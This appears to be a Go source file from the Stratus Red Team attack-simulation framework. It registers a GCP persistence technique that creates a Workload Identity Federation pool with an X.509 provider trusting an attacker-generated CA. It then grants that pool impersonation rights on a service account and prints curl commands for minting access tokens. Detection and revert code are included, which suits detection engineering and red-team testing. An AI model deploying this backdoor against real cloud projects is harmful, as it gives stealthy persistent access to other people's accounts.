package gcp

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	_ "embed"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"os"
	"strings"
	"time"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	iamv1 "google.golang.org/api/iam/v1"
)

//go:embed main.tf
var tf []byte

const wifProviderId = "stratus-red-team-x509"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.persistence.create-workload-identity-federation",
		FriendlyName: "Create a Workload Identity Federation Pool and Provider",
		Description: `
Creates a Workload Identity Federation (WIF) pool and an X.509 provider within it,
then grants the pool's identities permission to impersonate a target service account.
This simulates an attacker who has obtained access to a GCP project and establishes
a persistent backdoor by acting as their own certificate authority: any machine that
holds a certificate signed by the attacker's CA can silently exchange it for GCP
access tokens impersonating the target service account, without ever creating a
service account key.

This is the GCP equivalent of AWS IAM Roles Anywhere.

Warm-up:

- Create a target service account

Detonation:

- Generate an attacker-controlled CA certificate and a client certificate signed by it
- Create a Workload Identity Pool named <code>stratus-red-team-wif-&lt;suffix&gt;</code>
- Create an X.509 provider within the pool, trusting the attacker CA
- Grant <code>roles/iam.workloadIdentityUser</code> on the target service account
  to all identities in the pool (any cert signed by the attacker CA can impersonate it)
- Write <code>ca.crt</code>, <code>client.crt</code>, and <code>client.key</code> to the current directory

Revert:

- Remove the <code>roles/iam.workloadIdentityUser</code> binding from the service account
- Delete the X.509 provider
- Delete the Workload Identity Pool
- Remove <code>ca.crt</code>, <code>client.crt</code>, and <code>client.key</code>

References:

- https://cloud.google.com/iam/docs/workload-identity-federation-with-x509-certificates
- https://cloud.google.com/iam/docs/reference/rest/v1/projects.locations.workloadIdentityPools
- https://www.tenable.com/blog/how-attackers-can-exploit-gcps-multicloud-workload-solution
- https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse
`,
		Detection: `
Identify when a Workload Identity Federation pool or provider is created by
monitoring for <code>google.iam.admin.v1.CreateWorkloadIdentityPool</code> and
<code>google.iam.admin.v1.CreateWorkloadIdentityPoolProvider</code> events in GCP
Admin Activity audit logs. Alert on unexpected creation, especially X.509 providers
which allow certificate-based authentication from outside GCP.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func newIAMService(ctx context.Context, providers stratus.CloudProviders) (*iamv1.Service, error) {
	svc, err := iamv1.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to create IAM client: %w", err)
	}
	return svc, nil
}

func poolParent(projectId string) string {
	return fmt.Sprintf("projects/%s/locations/global", projectId)
}

func poolName(projectId, poolId string) string {
	return fmt.Sprintf("projects/%s/locations/global/workloadIdentityPools/%s", projectId, poolId)
}

func providerName(projectId, poolId, providerId string) string {
	return fmt.Sprintf(
		"projects/%s/locations/global/workloadIdentityPools/%s/providers/%s",
		projectId, poolId, providerId,
	)
}

// waitForOperation polls a WIF pool operation until it completes.
func waitForOperation(ctx context.Context, svc *iamv1.Service, opName string) error {
	const maxAttempts = 30
	for range maxAttempts {
		op, err := svc.Projects.Locations.WorkloadIdentityPools.Operations.Get(opName).Context(ctx).Do()
		if err != nil {
			return fmt.Errorf("failed to poll operation %s: %w", opName, err)
		}
		if op.Done {
			if op.Error != nil {
				return fmt.Errorf("operation %s failed: %s", opName, op.Error.Message)
			}
			return nil
		}
		time.Sleep(3 * time.Second)
	}
	return fmt.Errorf("operation %s did not complete after %d attempts", opName, maxAttempts)
}

// certBundle holds a generated CA and client certificate pair.
type certBundle struct {
	caCertPEM     string
	clientCertPEM string
	clientKeyPEM  string
}

// generateCerts creates a self-signed CA and a client certificate signed by it.
// The CA is only used to register the trust anchor in GCP; the client cert is
// what the attacker presents when exchanging for a GCP access token.
func generateCerts() (certBundle, error) {
	caKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return certBundle{}, fmt.Errorf("failed to generate CA key: %w", err)
	}

	caTemplate := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName:   "Stratus Red Team CA",
			Organization: []string{"Stratus Red Team"},
		},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(10 * 365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
		BasicConstraintsValid: true,
		IsCA:                  true,
	}

	caDER, err := x509.CreateCertificate(rand.Reader, caTemplate, caTemplate, &caKey.PublicKey, caKey)
	if err != nil {
		return certBundle{}, fmt.Errorf("failed to create CA certificate: %w", err)
	}
	caCert, err := x509.ParseCertificate(caDER)
	if err != nil {
		return certBundle{}, fmt.Errorf("failed to parse CA certificate: %w", err)
	}

	clientKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return certBundle{}, fmt.Errorf("failed to generate client key: %w", err)
	}
	clientTemplate := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject: pkix.Name{
			CommonName:   "stratus-red-team-backdoor",
			Organization: []string{"Stratus Red Team"},
		},
		NotBefore:   time.Now().Add(-time.Hour),
		NotAfter:    time.Now().Add(10 * 365 * 24 * time.Hour),
		KeyUsage:    x509.KeyUsageDigitalSignature,
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
	}

	clientDER, err := x509.CreateCertificate(rand.Reader, clientTemplate, caCert, &clientKey.PublicKey, caKey)
	if err != nil {
		return certBundle{}, fmt.Errorf("failed to create client certificate: %w", err)
	}

	clientKeyDER, err := x509.MarshalECPrivateKey(clientKey)
	if err != nil {
		return certBundle{}, fmt.Errorf("failed to marshal client key: %w", err)
	}

	return certBundle{
		caCertPEM:     string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caDER})),
		clientCertPEM: string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: clientDER})),
		clientKeyPEM:  string(pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: clientKeyDER})),
	}, nil
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	ctx := context.Background()
	poolId := params["pool_id"]
	saEmail := params["sa_email"]
	projectNumber := params["project_number"]

	log.Println("Generating attacker CA and client certificate")
	certs, err := generateCerts()
	if err != nil {
		return err
	}
	// Write all cert files before making any GCP API calls. If the operator's
	// gcloud ADC was previously configured to use these X.509 WIF credentials
	// (e.g., after an end-to-end test of a prior detonation), the GCP Go client
	// will try to authenticate stratus itself via mTLS using client.crt. Writing
	// the files first breaks that chicken-and-egg dependency.
	if err = os.WriteFile("ca.crt", []byte(certs.caCertPEM), 0600); err != nil {
		return fmt.Errorf("failed to write ca.crt: %w", err)
	}
	if err = os.WriteFile("client.crt", []byte(certs.clientCertPEM), 0600); err != nil {
		return fmt.Errorf("failed to write client.crt: %w", err)
	}
	if err = os.WriteFile("client.key", []byte(certs.clientKeyPEM), 0600); err != nil {
		return fmt.Errorf("failed to write client.key: %w", err)
	}

	svc, err := newIAMService(ctx, providers)
	if err != nil {
		return err
	}

	log.Printf("Creating Workload Identity Pool %s in project %s\n", poolId, projectId)
	poolOp, err := svc.Projects.Locations.WorkloadIdentityPools.Create(
		poolParent(projectId),
		&iamv1.WorkloadIdentityPool{
			DisplayName: "Stratus Red Team",
			Description: "Created by Stratus Red Team for attack simulation",
		},
	).WorkloadIdentityPoolId(poolId).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to create Workload Identity Pool: %w", err)
	}
	if err = waitForOperation(ctx, svc, poolOp.Name); err != nil {
		return fmt.Errorf("Workload Identity Pool creation did not complete: %w", err)
	}
	log.Printf("Successfully created Workload Identity Pool %s\n", poolId)

	// Register our self-signed CA as the trust anchor. GCP will accept any
	// client certificate signed by this CA when exchanging for a GCP token.
	log.Printf("Creating X.509 provider %s in pool %s\n", wifProviderId, poolId)
	providerOp, err := svc.Projects.Locations.WorkloadIdentityPools.Providers.Create(
		poolName(projectId, poolId),
		&iamv1.WorkloadIdentityPoolProvider{
			DisplayName: "Stratus Red Team X.509",
			Description: "Backdoor X.509 provider — attacker CA trusted for certificate exchange",
			X509: &iamv1.X509{
				TrustStore: &iamv1.TrustStore{
					TrustAnchors: []*iamv1.TrustAnchor{
						{PemCertificate: strings.TrimSpace(certs.caCertPEM)},
					},
				},
			},
			AttributeMapping: map[string]string{
				// google.subject is mapped to the certificate's Subject Common Name.
				// assertion.subject is a structured object; .dn.cn extracts the CN string.
				"google.subject": "assertion.subject.dn.cn",
			},
		},
	).WorkloadIdentityPoolProviderId(wifProviderId).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to create Workload Identity Pool Provider: %w", err)
	}
	if err = waitForOperation(ctx, svc, providerOp.Name); err != nil {
		return fmt.Errorf("Workload Identity Pool Provider creation did not complete: %w", err)
	}
	log.Printf("Successfully created X.509 provider %s\n", wifProviderId)

	// Grant workloadIdentityUser to all identities in the pool — any cert
	// signed by our CA can now impersonate the target SA.
	principalSet := fmt.Sprintf(
		"principalSet://iam.googleapis.com/projects/%s/locations/global/workloadIdentityPools/%s/*",
		projectNumber, poolId,
	)
	log.Printf("Granting roles/iam.workloadIdentityUser on %s to %s\n", saEmail, principalSet)
	_, err = svc.Projects.ServiceAccounts.SetIamPolicy(
		"projects/-/serviceAccounts/"+saEmail,
		&iamv1.SetIamPolicyRequest{
			Policy: &iamv1.Policy{
				Bindings: []*iamv1.Binding{
					{
						Role:    "roles/iam.workloadIdentityUser",
						Members: []string{principalSet},
					},
				},
			},
		},
	).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to grant workloadIdentityUser on %s: %w", saEmail, err)
	}

	providerAudience := fmt.Sprintf(
		"//iam.googleapis.com/projects/%s/locations/global/workloadIdentityPools/%s/providers/%s",
		projectNumber, poolId, wifProviderId,
	)
	log.Printf(
		"Backdoor established. ca.crt, client.crt, and client.key written to the current directory.\n\n"+
			"To obtain a GCP access token (requires openssl + jq):\n\n"+
			"  CLIENT_B64=$(openssl x509 -in client.crt -outform DER | base64 | tr -d '\\n')\n"+
			"  CA_B64=$(openssl x509 -in ca.crt -outform DER | base64 | tr -d '\\n')\n"+
			"  BODY=$(jq -cn --arg c \"$CLIENT_B64\" --arg ca \"$CA_B64\" --arg aud '%s' \\\n"+
			"    '{grant_type:\"urn:ietf:params:oauth:grant-type:token-exchange\",subject_token_type:\"urn:ietf:params:oauth:token-type:mtls\",requested_token_type:\"urn:ietf:params:oauth:token-type:access_token\",audience:$aud,scope:\"https://www.googleapis.com/auth/cloud-platform\",subject_token:([$c,$ca]|tostring)}')\n"+
			"  STS_TOKEN=$(curl -s --cert client.crt --key client.key \\\n"+
			"    -X POST https://sts.mtls.googleapis.com/v1/token \\\n"+
			"    -H 'Content-Type: application/json' -d \"$BODY\" | jq -r .access_token)\n"+
			"  curl -s -X POST \\\n"+
			"    https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken \\\n"+
			"    -H \"Authorization: Bearer $STS_TOKEN\" \\\n"+
			"    -H 'Content-Type: application/json' \\\n"+
			"    -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}'\n",
		providerAudience, saEmail,
	)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	ctx := context.Background()
	poolId := params["pool_id"]
	saEmail := params["sa_email"]

	svc, err := newIAMService(ctx, providers)
	if err != nil {
		return err
	}

	// Clear the SA binding before tearing down the pool so no window exists
	// where the binding references an already-deleted principal set.
	log.Printf("Removing roles/iam.workloadIdentityUser binding from %s\n", saEmail)
	_, err = svc.Projects.ServiceAccounts.SetIamPolicy(
		"projects/-/serviceAccounts/"+saEmail,
		&iamv1.SetIamPolicyRequest{
			Policy: &iamv1.Policy{Bindings: []*iamv1.Binding{}},
		},
	).Context(ctx).Do()
	if err != nil && !strings.Contains(err.Error(), "404") {
		return fmt.Errorf("failed to clear IAM policy on %s: %w", saEmail, err)
	}

	log.Printf("Deleting X.509 provider %s from pool %s\n", wifProviderId, poolId)
	providerOp, err := svc.Projects.Locations.WorkloadIdentityPools.Providers.Delete(
		providerName(projectId, poolId, wifProviderId),
	).Context(ctx).Do()
	if err != nil && !strings.Contains(err.Error(), "404") {
		return fmt.Errorf("failed to delete provider from pool %s: %w", poolId, err)
	}
	if providerOp != nil {
		if err = waitForOperation(ctx, svc, providerOp.Name); err != nil {
			return fmt.Errorf("provider deletion did not complete for pool %s: %w", poolId, err)
		}
	}
	log.Printf("Successfully deleted X.509 provider %s from pool %s\n", wifProviderId, poolId)

	log.Printf("Deleting Workload Identity Pool %s\n", poolId)
	poolOp, err := svc.Projects.Locations.WorkloadIdentityPools.Delete(
		poolName(projectId, poolId),
	).Context(ctx).Do()
	if err != nil && !strings.Contains(err.Error(), "404") {
		return fmt.Errorf("failed to delete Workload Identity Pool %s: %w", poolId, err)
	}
	if poolOp != nil {
		if err = waitForOperation(ctx, svc, poolOp.Name); err != nil {
			return fmt.Errorf("pool deletion did not complete for %s: %w", poolId, err)
		}
	}
	log.Printf("Successfully deleted Workload Identity Pool %s\n", poolId)

	for _, f := range []string{"ca.crt", "client.crt", "client.key"} {
		if err = os.Remove(f); err != nil && !os.IsNotExist(err) {
			log.Printf("Warning: failed to remove %s: %v\n", f, err)
		}
	}
	return nil
}
